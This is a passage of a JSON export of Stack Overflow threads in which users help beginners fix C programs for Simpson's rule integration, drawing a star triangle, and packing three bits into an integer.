1444839524, "post_id": 33129928, "comment_id": 54072858, "body": "The comma in the scanf means when you are entering the values you separate them by a comma. But I tried it anyway and it didnt work. And checked it out with printf and the value are the correct ones."}, {"owner": {"reputation": 63, "user_id": 3908631, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4d7a01cbfb01fa1ada1ee7dbd12c5bfc?s=128&d=identicon&r=PG&f=1", "display_name": "user3908631", "link": "https://stackoverflow.com/users/3908631/user3908631"}, "edited": false, "score": 0, "creation_date": 1444842376, "post_id": 33129928, "comment_id": 54074512, "body": "Thank you, with those fixes it is a lot better approximation."}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "reply_to_user": {"reputation": 63, "user_id": 3908631, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4d7a01cbfb01fa1ada1ee7dbd12c5bfc?s=128&d=identicon&r=PG&f=1", "display_name": "user3908631", "link": "https://stackoverflow.com/users/3908631/user3908631"}, "edited": false, "score": 0, "creation_date": 1444842472, "post_id": 33129928, "comment_id": 54074557, "body": "@user3908631, I am glad I was able to help."}], "tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": true, "score": 3, "last_activity_date": 1444842408, "last_edit_date": 1444842408, "creation_date": 1444837670, "answer_id": 33129928, "question_id": 33129385, "link": "https://stackoverflow.com/questions/33129385/simpsons-rule-error/33129928#33129928", "title": "Simpson&#39;s Rule error", "body": "<p>The problem you are seeing is probably because of the format string used to read the numbers.</p>\n\n<pre><code>scanf(\"%d %lf,%lf\",&amp;n,&amp;y,&amp;z);\n         // ^^^ Is the , there on purpose?\n</code></pre>\n\n<p>Try removing that <code>,</code> from the format string and see if the problem goes away.</p>\n\n<p>It cannot be emphasized enough - <strong>Always check the return value of <code>scanf</code></strong>.</p>\n\n<pre><code>if ( scanf(\"%d %lf %lf\", &amp;n, &amp;y, &amp;z) != 3 )\n{\n   // Deal with error.\n}\n</code></pre>\n\n<p>To make sure that the numbers read are accurate, add a line that echos the input back to <code>stdout</code>.</p>\n\n<pre><code>printf(\"n: %d, y: %lf, z: %lf\\n\", n, y, z);\n</code></pre>\n\n<p>I noticed couple of errors in your code:</p>\n\n<ol>\n<li><p>The interval <code>h</code> is not right. Since you are using <code>n</code> points, there are <code>n-1</code> intervals. Hence, <code>h</code> has to be:</p>\n\n<pre><code>h = (z-y)/(n-1); \n</code></pre></li>\n<li><p>Since you are adding <code>f(y)</code> and <code>f(z)</code> in the very last statement, the loop has to be:</p>\n\n<pre><code>// Not good to use for(i=0;i&lt;n;i++)\nfor(i=1;i&lt;n-1;i++)\n{\n</code></pre></li>\n</ol>\n\n<p>With those fixes, I get the output of <code>1.440422</code> using <code>n = 1001</code>.</p>\n"}], "owner": {"reputation": 63, "user_id": 3908631, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4d7a01cbfb01fa1ada1ee7dbd12c5bfc?s=128&d=identicon&r=PG&f=1", "display_name": "user3908631", "link": "https://stackoverflow.com/users/3908631/user3908631"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 545, "favorite_count": 0, "accepted_answer_id": 33129928, "answer_count": 1, "score": 3, "last_activity_date": 1444842408, "creation_date": 1444836206, "question_id": 33129385, "link": "https://stackoverflow.com/questions/33129385/simpsons-rule-error", "title": "Simpson&#39;s Rule error", "body": "<p>This code is using Simpson's rule to calculate the integral of x*sin(x) with the bounds of (1,2). The problem I am having is, while its getting very close to the actual value. Even with 999 iterations, it still doesn\u2019t hit the point. While I have a separate program that uses trapezoidal rule for the same thing, and it DOES hit the point exactly after 1000 iterations. The point it should hit is \"1.440422\"</p>\n\n<p>Is that what should be happening for Simpson's rule? Or is there something wrong with my code?</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\ndouble f(double x);\nint main()\n{\n  double x,result,y,z,h,s1,s2;\n  s1 = 0;\n  s2 = 0;\n  int i,n;\n  printf(\"\\nHow many points to you want it evaluated at (odd number)? And what are the bounds? lower bound,upper bound &gt;\\n\");\n  scanf(\"%d %lf,%lf\",&amp;n,&amp;y,&amp;z);\n  h = (z-y)/n;\n  result = 0;\n  if(n%2!=0)\n    {\n      for(i=0;i&lt;n;i++)\n    {\n      if(i%2==0)\n        {\n          s1 = s1+f(y+i*h);\n        }\n      else\n        {\n          s2 = s2+f(y+i*h);\n        }\n    }\n      result = (h/3)*(f(y)+f(z)+4*s2+2*s1);\n      printf(\"\\nThe value is %lf with %d interations\\n\",result,i);\n    }\n  else \n    {\n      printf(\"\\n The number of points has to be odd, try again\\n\");\n    }\n}\n\n\ndouble f(double x)\n{\n  return(x*sin(x));\n}\n</code></pre>\n"}, {"tags": ["c", "loops"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1444836297, "post_id": 33129372, "comment_id": 54070673, "body": "Just a note, before that, if i only run the executable, i&#39;ll get a segfault. :)"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1444836413, "post_id": 33129372, "comment_id": 54070754, "body": "Segfault means &#39;bug&#39;.  You need to print fewer spaces at the front of the line on the second and third lines than on the first; you need to modify your loop to accommodate that.  Using <code>atoi()</code> means you won&#39;t get useful error reporting (but you will report &#39;infinity&#39; as &#39;too small&#39;).  Consider using <code>strtol()</code> \u2014 but look for questions on SO on how to do so because it is hard to use well. Or consider GIGO: Garbage In, Garbage Out. A bad input yields an error message, but not a good one. Print error messages on standard error (<code>stderr</code>); that&#39;s what it&#39;s for. And print the erroneous value too."}, {"owner": {"reputation": 3199, "user_id": 2864062, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/837cfd1b02c3b7dbf6448a6b2314ed23?s=128&d=identicon&r=PG&f=1", "display_name": "Steven Hansen", "link": "https://stackoverflow.com/users/2864062/steven-hansen"}, "edited": false, "score": 1, "creation_date": 1444836415, "post_id": 33129372, "comment_id": 54070756, "body": "Just a note, you should check <code>argc</code> (number of arguments) before de-referencing <code>argv</code> which is what causes your segfault when running the executable with no arguments."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1444836491, "post_id": 33129372, "comment_id": 54070807, "body": "ummm, I don&#39;t understand why everyone is replying to my comment. It was a hypothetical one. :)"}, {"owner": {"reputation": 3199, "user_id": 2864062, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/837cfd1b02c3b7dbf6448a6b2314ed23?s=128&d=identicon&r=PG&f=1", "display_name": "Steven Hansen", "link": "https://stackoverflow.com/users/2864062/steven-hansen"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 1, "creation_date": 1444836566, "post_id": 33129372, "comment_id": 54070853, "body": "@SouravGhosh It&#39;s cause for some reason I thought the use of the &quot;I&quot; pro-noun meant you were the OP.  Didn&#39;t check the names."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 1, "creation_date": 1444836643, "post_id": 33129372, "comment_id": 54070907, "body": "@SouravGhosh: me too..."}, {"owner": {"reputation": 6529, "user_id": 4252320, "user_type": "registered", "accept_rate": 59, "profile_image": "https://lh3.googleusercontent.com/-_DAs7Dtci9U/AAAAAAAAAAI/AAAAAAAAIf8/96ZNJAUF2Xk/photo.jpg?sz=128", "display_name": "ergonaut", "link": "https://stackoverflow.com/users/4252320/ergonaut"}, "edited": false, "score": 0, "creation_date": 1444836666, "post_id": 33129372, "comment_id": 54070928, "body": "your blank space loop has no variability.  With any height H, it will print H spaces every line, every time."}, {"owner": {"reputation": 253, "user_id": 4509619, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/73e5bea83e1c4f62d170ac122e9e4e42?s=128&d=identicon&r=PG&f=1", "display_name": "Kommander Kitten", "link": "https://stackoverflow.com/users/4509619/kommander-kitten"}, "edited": false, "score": 0, "creation_date": 1444836729, "post_id": 33129372, "comment_id": 54070977, "body": "Well this is a lot of information at once. Should my if statement look like  <code>if (argc==NULL)  {printf(&quot;error&quot;)}</code>"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1444836790, "post_id": 33129372, "comment_id": 54071019, "body": "OK, I was just trying to pass a hint to OP. It&#39;s ok, I believe OP got the required info. :)"}], "answers": [{"comments": [{"owner": {"reputation": 253, "user_id": 4509619, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/73e5bea83e1c4f62d170ac122e9e4e42?s=128&d=identicon&r=PG&f=1", "display_name": "Kommander Kitten", "link": "https://stackoverflow.com/users/4509619/kommander-kitten"}, "edited": false, "score": 0, "creation_date": 1444837007, "post_id": 33129612, "comment_id": 54071172, "body": "What is the purpose of the &#39;10&#39; in your <code>strtol</code> statement?"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 253, "user_id": 4509619, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/73e5bea83e1c4f62d170ac122e9e4e42?s=128&d=identicon&r=PG&f=1", "display_name": "Kommander Kitten", "link": "https://stackoverflow.com/users/4509619/kommander-kitten"}, "edited": false, "score": 0, "creation_date": 1444837135, "post_id": 33129612, "comment_id": 54071275, "body": "@KommanderKitten That specifies that the number is in base 10.  You could pass in 2 for binary, 8 or octal, 16 for hexidecimal, or any base from 2 to 36."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 2, "last_activity_date": 1444836782, "creation_date": 1444836782, "answer_id": 33129612, "question_id": 33129372, "link": "https://stackoverflow.com/questions/33129372/drawing-triangle-in-c/33129612#33129612", "title": "drawing triangle in c", "body": "<p>Your loop that prints leading spaces is always printing the same amount of spaces each time.  You need to print 1 less space on each subsequent line.  You can do this by starting the loop with <code>j=i</code> instead of <code>j=1</code>.</p>\n\n<p>Instead of using <code>atoi()</code>, use <code>strtol()</code> as follows:</p>\n\n<pre><code>char *p;\nerrno = 0 ;\nheight = strtol(argv[1], &amp;p, 10);\nif (errno != 0 || p == argv[1]) {\n    printf(\"invalid input\");\n    exit(1);\n}\n</code></pre>\n\n<p>If there's an error in parsing, <code>errno</code> will be set to a non-zero value.  The <code>p</code> parameter on return will point to the first character that is not a digit.  So if it points to the start of the string, then it's not a number.</p>\n\n<p>Also, be sure to check that <code>argv[1]</code> is actually present:</p>\n\n<pre><code>if (argc &lt; 2) {\n    printf(\"not enough arguments\\n\");\n    exit(1);\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "edited": false, "score": 0, "creation_date": 1444837213, "post_id": 33129707, "comment_id": 54071336, "body": "A c compiler shouldn&#39;t even let you compile with int i and int j defined in the loop conditions. I smell a sneaky c++ compiler being used on a c program here."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "reply_to_user": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "edited": false, "score": 0, "creation_date": 1444841533, "post_id": 33129707, "comment_id": 54074014, "body": "@MPI_What: Defining loop variables in the init part of the <code>for</code> is legal (and good) C as of C99."}, {"owner": {"reputation": 21, "user_id": 4191750, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/411a6ac6e49d8b96139d49a4e34bfa77?s=128&d=identicon&r=PG&f=1", "display_name": "donken", "link": "https://stackoverflow.com/users/4191750/donken"}, "edited": false, "score": 0, "creation_date": 1444842269, "post_id": 33129707, "comment_id": 54074459, "body": "For scope, efficiency and cleanliness, I prefer to define variables where they are needed in C++, Java, etc. However, in C I find it easier to simply define them at the top that way no confusion happens if you bounce between compilers. That&#39;s just my preference, I should have stated that in the original comment."}, {"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "reply_to_user": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1444846984, "post_id": 33129707, "comment_id": 54077169, "body": "@MOehm Orly? That&#39;s something I didn&#39;t know. Cheers :)."}], "tags": [], "owner": {"reputation": 21, "user_id": 4191750, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/411a6ac6e49d8b96139d49a4e34bfa77?s=128&d=identicon&r=PG&f=1", "display_name": "donken", "link": "https://stackoverflow.com/users/4191750/donken"}, "is_accepted": false, "score": 0, "last_activity_date": 1444837013, "creation_date": 1444837013, "answer_id": 33129707, "question_id": 33129372, "link": "https://stackoverflow.com/questions/33129372/drawing-triangle-in-c/33129707#33129707", "title": "drawing triangle in c", "body": "<p>I've found, though not necessary, it is always better to give your ints an initial value. Can cause very annoying bugs when the program gets bigger. Also define your i and j at the beginning.</p>\n\n<pre><code>int height = 0;\nint limit = 0;\nint i = 0;\nint j = 0;\n</code></pre>\n\n<p>Also j should be a different value each time. For example:</p>\n\n<pre><code>for(j = i; j &lt;= height; j++)\n{\n  printf(\" \");\n}\n</code></pre>\n\n<p>As for the letter or number portion you might want to look into the isdigit function at: <a href=\"http://www.tutorialspoint.com/c_standard_library/c_function_isdigit.htm\" rel=\"nofollow\">http://www.tutorialspoint.com/c_standard_library/c_function_isdigit.htm</a></p>\n"}, {"tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": false, "score": 0, "last_activity_date": 1444838151, "creation_date": 1444838151, "answer_id": 33130081, "question_id": 33129372, "link": "https://stackoverflow.com/questions/33129372/drawing-triangle-in-c/33130081#33130081", "title": "drawing triangle in c", "body": "<p>There are probably 20 ways to do this. The key is to realize you have to increase the number of <code>'*'</code>'s by 2 as you reduce the spacing by 1:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n#define SLIMIT 120\n\nint main (int argc, char **argv) {\n\n    size_t height = argc &gt; 1 ? atoi (argv[1]) * 2: 12;\n    size_t space;\n    size_t i;\n\n    if (height &lt; 1) {\n        fprintf (stderr, \"error: invalid height '%zu'\\n\", height);\n        return 1;\n    }\n\n    space = (height + 1)/2;\n\n    for (i = 1; i &lt; height+1; i+=2,space--) {\n        char tstring[SLIMIT+1] = {0};\n        memset (tstring, '*', i);\n        printf (\"%*s%s\\n\", space, \" \", tstring);\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p><strong>Example Output</strong></p>\n\n<pre><code>$ ./bin/triangle 12\n            *\n           ***\n          *****\n         *******\n        *********\n       ***********\n      *************\n     ***************\n    *****************\n   *******************\n  *********************\n ***********************\n</code></pre>\n\n<p><strong>Note:</strong> this is currently limited to width of 60 (1/2 <code>SLIMIT</code>).</p>\n"}], "owner": {"reputation": 253, "user_id": 4509619, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/73e5bea83e1c4f62d170ac122e9e4e42?s=128&d=identicon&r=PG&f=1", "display_name": "Kommander Kitten", "link": "https://stackoverflow.com/users/4509619/kommander-kitten"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3852, "favorite_count": 0, "accepted_answer_id": 33129612, "answer_count": 3, "score": 0, "last_activity_date": 1444838151, "creation_date": 1444836181, "question_id": 33129372, "link": "https://stackoverflow.com/questions/33129372/drawing-triangle-in-c", "title": "drawing triangle in c", "body": "<p>I'm currently working on an exercise to draw a triangle from a C program. The user inputs the height of the triangle in the command line and the triangle is printed with \"*\"s.</p>\n\n<p>For example, an input of 3 will output:</p>\n\n<pre><code>  *\n ***\n*****\n</code></pre>\n\n<p>Here is what I have so far:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, const char *argv[]) {\n\n    //initialize height variable and bottom variable\n    int height, limit;\n    //take command line argument and save it as an int. This ensures\n    height = atoi(argv[1]);\n\n    printf(\"You have chosen to draw a triangle of height: %d\\n\", height);\n\n    if (height&lt;1) {\n        printf(\"ERROR: Height too small.\\n\");\n        exit(1);\n    }\n    else if (height&gt;100) {\n        printf(\"ERROR: Height too large.\\n\");\n        exit(1);\n    }\n    for (int i = 1; i &lt;= height; i++)\n    {\n            limit=0;\n\n        // this 'for' loop will take care of printing the blank spaces\n        for (int j = 1; j &lt;= height; j++)\n        {\n            printf(\" \");\n        }\n        //This while loop actually prints the \"*\"s of the triangle.\n        while(limit!=2*i-1) {\n            printf(\"*\");\n            limit++;\n        }\n        limit=0;\n        //We print a new line and start the loop again\n        printf(\"\\n\");\n    }\n\nreturn 0;\n}\n</code></pre>\n\n<p>I have two problems: </p>\n\n<ol>\n<li>The triangle produced by the program has the correct number of *'s, and is offset the correct number of spaces, but only produces a half triangle.</li>\n</ol>\n\n<p>This is the current output of my program:</p>\n\n<pre><code>  *\n  ***\n  *****\n</code></pre>\n\n<ol start=\"2\">\n<li>I'm not sure how to form the if statement to catch if the user enters something that is not an integer. Using atoi() casts the input as an integer, but if the user enters, say, \"yes\", the error that the height is too small will be thrown. How can I work around this?</li>\n</ol>\n"}, {"tags": ["c", "embedded", "bit-manipulation"], "comments": [{"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 0, "creation_date": 1444835099, "post_id": 33128934, "comment_id": 54069856, "body": "What if <code>var1 = 1; var2 = 0; var3 = 0</code> ? Should it be 4 or 1?"}, {"owner": {"reputation": 105, "user_id": 3475003, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/2440f4c7f7f0710374eb645c69643bcd?s=128&d=identicon&r=PG&f=1", "display_name": "user3475003", "link": "https://stackoverflow.com/users/3475003/user3475003"}, "reply_to_user": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 0, "creation_date": 1444835440, "post_id": 33128934, "comment_id": 54070076, "body": "It should be a 4. Just a binary number."}, {"owner": {"reputation": 2556, "user_id": 3488231, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/da4ac79b71c44d696f3567d4b53f6239?s=128&d=identicon&r=PG&f=1", "display_name": "user12205", "link": "https://stackoverflow.com/users/3488231/user12205"}, "edited": false, "score": 1, "creation_date": 1444835627, "post_id": 33128934, "comment_id": 54070230, "body": "<code>var1 * 4 + var2 * 2 + var3</code>?"}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 3, "creation_date": 1444835657, "post_id": 33128934, "comment_id": 54070256, "body": "typical x-y problem, possible solution is that those three variables should be saved in one variable and naturally form a integer in the first place, then what needs to be done is simply masking them out and shift right to the lsb."}, {"owner": {"reputation": 105, "user_id": 3475003, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/2440f4c7f7f0710374eb645c69643bcd?s=128&d=identicon&r=PG&f=1", "display_name": "user3475003", "link": "https://stackoverflow.com/users/3475003/user3475003"}, "edited": false, "score": 0, "creation_date": 1444836376, "post_id": 33128934, "comment_id": 54070735, "body": "Output should be decimal 0 - 7 NOT 1 - 8. ."}, {"owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "edited": false, "score": 0, "creation_date": 1444855844, "post_id": 33128934, "comment_id": 54082272, "body": "define what you mean by decimal, computers are binary.  do you mean ascii or you mean that the number should be between 0 and 7 (binary or decimal)"}], "answers": [{"tags": [], "owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "is_accepted": false, "score": 1, "last_activity_date": 1444835545, "last_edit_date": 1444835545, "creation_date": 1444835186, "answer_id": 33129013, "question_id": 33128934, "link": "https://stackoverflow.com/questions/33128934/combining-three-bits-to-get-a-single-integer-value/33129013#33129013", "title": "Combining three bits to get a single integer value", "body": "<p>This works: </p>\n\n<p>You shift the first bit 2 bits to the left with &lt;&lt; 2, the second bit 1 bit to the left with &lt;&lt; 1 and leave the last bit as it's in the last place.\nThat gives you 3 variables which are now 100, 000 and 001, You then or them together with | to get 101 i.e. 5.</p>\n\n<p>I.e.</p>\n\n<p>v1 is currently 001 in binary and you want it to be the 3rd bit, I.e. 100, so you need to shift it 2 to the left <code>(v1 &lt;&lt; 2)</code></p>\n\n<p>Likewise, v2 is currently 000, and you want the 0 to be the 2nd bit, so you shift it 1 to the left <code>(v2 &lt;&lt; 1)</code> to give 000 (trivial in this case but obviously different with a 1 here).</p>\n\n<p>Finally, v3 is 001 and you want it to be the 3rd bit... It already is so we can leave it where it is.</p>\n\n<p>Finally to combine them, we or the values together with <code>|</code></p>\n\n<p>100 |</p>\n\n<p>000 |</p>\n\n<p>001 =</p>\n\n<p>101 = 5 in binary</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n{\n    int v1=1, v2=0, v3=1;\n\n    int result;\n\n    result = (v1 &lt;&lt; 2) | (v2 &lt;&lt; 1) | v3;\n\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "is_accepted": false, "score": 3, "last_activity_date": 1444835205, "creation_date": 1444835205, "answer_id": 33129022, "question_id": 33128934, "link": "https://stackoverflow.com/questions/33128934/combining-three-bits-to-get-a-single-integer-value/33129022#33129022", "title": "Combining three bits to get a single integer value", "body": "<ol>\n<li>Make sure the values are 0 or 1 for safety: AND with 1 do this</li>\n<li>move these 0/1 values to proper positions: done with <code>&lt;&lt;</code> operator</li>\n<li>combine them: OR these values</li>\n</ol>\n\n<p>if <code>var1 = 1; var2 = 0; var3 = 0</code> should be 4, use this:<br>\n<code>((var1 &amp; 1) &lt;&lt; 2) | ((var2 &amp; 1) &lt;&lt; 1) | (var3 &amp; 1)</code></p>\n\n<p>if <code>var1 = 1; var2 = 0; var3 = 0</code> should be 1, use this:<br>\n<code>((var3 &amp; 1) &lt;&lt; 2) | ((var2 &amp; 1) &lt;&lt; 1) | (var1 &amp; 1)</code></p>\n"}, {"comments": [{"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1444835694, "post_id": 33129099, "comment_id": 54070275, "body": "bit shift has lower precedence than plus"}, {"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "edited": false, "score": 0, "creation_date": 1444836038, "post_id": 33129099, "comment_id": 54070483, "body": "You should be or-ing these together, not adding them."}, {"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "edited": false, "score": 1, "creation_date": 1444837296, "post_id": 33129099, "comment_id": 54071385, "body": "Ah yes, doesn&#39;t matter. Ignore my comment.  + and | are identical here."}], "tags": [], "owner": {"reputation": 124, "user_id": 3376587, "user_type": "registered", "accept_rate": 50, "profile_image": "https://graph.facebook.com/569003641/picture?type=large", "display_name": "user3376587", "link": "https://stackoverflow.com/users/3376587/user3376587"}, "is_accepted": false, "score": 2, "last_activity_date": 1444836068, "last_edit_date": 1444836068, "creation_date": 1444835409, "answer_id": 33129099, "question_id": 33128934, "link": "https://stackoverflow.com/questions/33128934/combining-three-bits-to-get-a-single-integer-value/33129099#33129099", "title": "Combining three bits to get a single integer value", "body": "<p>var1 = 1, var2 = 0, var3 = 1, var4 = 1, var5 = 0, var6 = 0, var7 = 1, var8 = 0</p>\n\n<p>byte = (var1&lt;&lt;7)+(var2&lt;&lt;6)+(var3&lt;&lt;5)+(var4&lt;&lt;4)+(var5&lt;&lt;3)+(var6&lt;&lt;2)+(var7&lt;&lt;1)+var8;</p>\n\n<p>value of byte is 10110010</p>\n"}, {"comments": [{"owner": {"reputation": 105, "user_id": 3475003, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/2440f4c7f7f0710374eb645c69643bcd?s=128&d=identicon&r=PG&f=1", "display_name": "user3475003", "link": "https://stackoverflow.com/users/3475003/user3475003"}, "edited": false, "score": 0, "creation_date": 1444837479, "post_id": 33129472, "comment_id": 54071513, "body": "So an OR could be used in place of the + too?"}, {"owner": {"reputation": 2016, "user_id": 5141989, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/3dPUW.jpg?s=128&g=1", "display_name": "Mike -- No longer here", "link": "https://stackoverflow.com/users/5141989/mike-no-longer-here"}, "reply_to_user": {"reputation": 105, "user_id": 3475003, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/2440f4c7f7f0710374eb645c69643bcd?s=128&d=identicon&r=PG&f=1", "display_name": "user3475003", "link": "https://stackoverflow.com/users/3475003/user3475003"}, "edited": false, "score": 0, "creation_date": 1444838320, "post_id": 33129472, "comment_id": 